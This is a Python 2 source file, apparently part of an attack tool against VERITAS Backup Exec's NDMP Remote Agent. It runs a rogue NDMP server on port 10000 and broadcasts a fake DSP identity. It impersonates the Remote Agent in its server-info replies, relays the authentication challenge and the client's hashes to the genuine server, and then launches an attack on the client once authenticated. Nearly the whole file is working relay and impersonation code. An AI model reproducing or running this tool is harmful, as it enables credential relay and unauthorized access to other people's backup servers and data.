'''
Created on 14-Jan-2010

@author: nibin
'''


import struct
import sys
import socket
from ndmp import *

from client_ndmp import *
from dynamic_thread import *

class server_ndmp():
    
    #Listen to 10K port
    HOST = ''
    PORT = 10000
    conn = None
    addr = ()
    
    dma_ip = None
    dsp_ip = None
    dsp_nbname = None
    mode = None
    threads = []
    
    def __init__(self, dma_ip, dsp_ip, dsp_nbname, fake_ip):
        server_ndmp.dma_ip = dma_ip
        server_ndmp.dsp_ip = dsp_ip
        server_ndmp.dsp_nbname = dsp_nbname
        #server_ndmp.mode = mode
        server_ndmp.fake_ip = fake_ip
        
        self.__sock_server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.__sock_server.bind((server_ndmp.HOST,server_ndmp.PORT))
        self.__sock_server.listen(1)
        self.__obj_client_ndmp = client_ndmp(server_ndmp.dsp_nbname, server_ndmp.dsp_ip)
        self.__do_attack = False
        
        t = dynamic_thread("broadcast_fake_dsp", name="fake_dsp01", dsp_nbname=server_ndmp.dsp_nbname, 
                           fake_ip=server_ndmp.fake_ip, dma_ip= server_ndmp.dma_ip )
        t.start()
        server_ndmp.threads.append(t)
        
        print "[*] Server started"
        
        
        
    def print_data(self,data):
        PRINT = False
        if PRINT:
            for x in  range(0,len(data)):
              if x%8 ==0:
                  print
              print "0x%02x" % struct.unpack("<B",data[x]),
            print        
    
    def parse_ndmp(self,data):
      temp = ndmp()
      a_obj = temp.parse(data)
      DEBUG= True
      if DEBUG:
        print "Debug---------"
        print "Sequence : 0x%08x" % a_obj.__getitem__('sequence')
        print "Message_Name : 0x%08x" % a_obj.__getitem__('message_name')
        print "Message_Type : 0x%08x" % a_obj.__getitem__('message_type')
        print "Reply_Sequence : 0x%08x" % a_obj.__getitem__('reply_sequence')
        print "Error : 0x%08x" % a_obj.__getitem__('err')
        
        #print a_obj.__getitem__('message_name')[0]
        print "Debug_ends"
      
      return a_obj
      
      #print "Sequence : 0x%08x" % struct.unpack(">L",a_obj.__getitem__('sequence')) 
     
    def pre_run(self):
        server_ndmp.conn, server_ndmp.addr  = self.__sock_server.accept()
        print "[*] Connected by ", server_ndmp.addr
        #try:
        while 1:
          recv_data = server_ndmp.conn.recv(1024)
          print "[*] Data Received!!!"
          self.print_data(recv_data)
          ndmp_pkt =self.parse_ndmp(recv_data)
          
          if ndmp_pkt.__getitem__('message_name')[0] ==int(0x108): #CONFIG_GET_SERVER_INFO
            print "[*] Received a CONFIG_GET_SERVER_INFO reqst"
            temp = ndmp()
            temp.pkt.__setitem__('sequence',(ndmp_pkt.__getitem__('sequence')[0])+1)
            temp.pkt.__setitem__('reply_sequence',ndmp_pkt.__getitem__('sequence')[0])
            temp.pkt.__setitem__('message_type',1) #Reply
            temp.pkt.__setitem__('message_name',int(0x108))
            #temp.pkt.__setitem__('err',int(0))
            temp.pkt.__setitem__('data', "\x00\x00\x00\x00" + \
                                        "\x00\x00\x00\x17" + \
                                        "VERITAS Software, Corp.\x00" + \
                                        "\x00\x00\x00\x13" + \
                                        "Remote Agent for NT\x00" + \
                                        "\x00\x00\x00\x03" + \
                                        "\x36\x2e\x33\x00" + \
                                        "\x00\x00\x00\x03" + \
                                        "\x00\x00\x00\xbe" + \
                                        "\x00\x00\x00\x05" + \
                                        "\x00\x00\x00\x04")
            q = temp.dump()
            #self.print_data(q)  
            send_data = struct.pack(">L",len(q)+0x80000000)+q
            server_ndmp.conn.send(send_data)
            print "[*] Sending a CONFIG_GET_SERVER_INFO reply"
            self.print_data(send_data)  
            #self.send_data(q) #TODO: Later
          elif ndmp_pkt.__getitem__('message_name')[0] ==int(0x900): #CONNECT_OPEN
            print "[*] Received a CONNECT_OPEN reqst"
            temp = ndmp()
            temp.pkt.__setitem__('sequence',(ndmp_pkt.__getitem__('sequence')[0])+1)
            temp.pkt.__setitem__('reply_sequence',ndmp_pkt.__getitem__('sequence')[0])
            temp.pkt.__setitem__('message_type',1) #Reply
            temp.pkt.__setitem__('message_name',int(0x900))
            temp.pkt.__setitem__('data',"\x00\x00\x00\x00") #CONNECT OPEN No Error
            q = temp.dump()
            send_data = struct.pack(">L",len(q)+0x80000000)+q
            server_ndmp.conn.send(send_data)
            print "[*] Sending a CONNECT_OPEN reply"
            self.print_data(send_data)  
            
          elif ndmp_pkt.__getitem__('message_name')[0] ==int(0x103): #CONFIG_GET_AUTH_ATTR
            print "[*] Received a CONFIG_GET_AUTH_ATTR reqst"
            temp = ndmp()
            print "[*] Shoot the client now"
            magic = self.__obj_client_ndmp.pre_run()
            
            print "Debug: Magic data"
            
            self.print_data(magic)
            
            temp.pkt.__setitem__('sequence',(ndmp_pkt.__getitem__('sequence')[0])+1)
            temp.pkt.__setitem__('reply_sequence',ndmp_pkt.__getitem__('sequence')[0])
            temp.pkt.__setitem__('message_type',1) #Reply
            temp.pkt.__setitem__('message_name',int(0x103))
            
            temp.pkt.__setitem__('data',  "\x00\x00\x00\x00" + \
                                                       "\x00\x00\x00\xbe" + \
                                                        magic)
            q = temp.dump()
            send_data = struct.pack(">L",len(q)+0x80000000)+q
            server_ndmp.conn.send(send_data)
            print "[*] Sending a CONFIG_GET_AUTH_ATTR reply"
            self.print_data(send_data)  
            
          elif ndmp_pkt.__getitem__('message_name')[0] ==int(0x901): #CONNECT_CLIENT_AUTH
            print "[*] Received a CONNECT_CLIENT_AUTH reqst"
            temp = ndmp()
            print "[*] Shoot the client to send hashes.."
            result = self.__obj_client_ndmp.auth_run(ndmp_pkt.__getitem__('data'))
            
            print "Debug: Magic data"
            
            self.print_data(result)
            
            temp.pkt.__setitem__('sequence',(ndmp_pkt.__getitem__('sequence')[0])+1)
            temp.pkt.__setitem__('reply_sequence',ndmp_pkt.__getitem__('sequence')[0])
            temp.pkt.__setitem__('message_type',1) #Reply
            temp.pkt.__setitem__('message_name',int(0x901))
            
            temp.pkt.__setitem__('data',  result)
            q = temp.dump()
            send_data = struct.pack(">L",len(q)+0x80000000)+q
            server_ndmp.conn.send(send_data)
            print "[*] Sending a CONNECT_CLIENT_AUTH reply 2 Server!!!"
            print "[*] All the Best!!!"
            self.__do_attack = True
            self.print_data(send_data)  
          elif ndmp_pkt.__getitem__('message_name')[0] ==int(0xf33b):
            print "[*] Some propritary..gonna send to Client"  
            temp = ndmp()
            print "[*] Shoot the client again phase 2!!!"
            d = self.__obj_client_ndmp.doubt_run(ndmp_pkt.__getitem__('message_name')[0]) #now its 0xf33b
            
            temp.pkt.__setitem__('sequence',(ndmp_pkt.__getitem__('sequence')[0])+1)
            temp.pkt.__setitem__('reply_sequence',ndmp_pkt.__getitem__('sequence')[0])
            temp.pkt.__setitem__('message_type',1) #Reply
            temp.pkt.__setitem__('message_name',int(0xf33b))
            
            temp.pkt.__setitem__('data',  d) # Sending the data to client..fucking relay
            q = temp.dump()
            send_data = struct.pack(">L",len(q)+0x80000000)+q
            server_ndmp.conn.send(send_data)
            print "[*] Sending a 0xf33b reply 2 Server"
            self.print_data(send_data)  
            asa = raw_input("Hit any key")
          else:  
              print "[*] Other Types: Need to work on"
              print "Message : 0x%08x" % ndmp_pkt.__getitem__('message_name')
              asa = raw_input("Hit any key") #Debug
              if(self.__do_attack):
                  print "[*] Begin attack the client"
                  self.__obj_client_ndmp.attack()
                  
                  #asa = raw_input("Hit any key to shut down")
                  self.__obj_client_ndmp.shutdown()
                  self.shutdown()
                  break
                  #sys.exit()
        
    def shutdown(self):
        server_ndmp.conn.close()    
   